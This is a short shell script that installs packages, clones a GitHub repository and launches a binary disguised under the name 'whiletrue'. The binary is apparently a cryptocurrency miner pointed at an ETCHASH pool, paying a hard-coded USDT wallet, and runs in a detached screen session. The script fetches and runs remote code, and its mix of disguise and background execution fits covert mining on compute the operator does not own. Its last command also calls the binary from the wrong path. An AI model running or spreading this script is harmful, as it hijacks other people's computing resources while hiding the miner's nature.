#!/bin/sh 
sudo apt update 
sudo apt-get install zip unzip 
sudo apt install screen -y 
screen -dmS etciflex.sh 65 75 
sudo git clone https://github.com/andromedasizu/andromedasizu.git 
cd andromedasizu 
chmod +x whiletrue
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && /whiletrue --algo ETCHASH --pool etchash.unmineable.com:4444 --user USDT:TLPbsRkFNUAutW7V5XeiC4jt9RDJd8xwVP.$(echo $(shuf -i 1-9999 -n 1)-Masku)
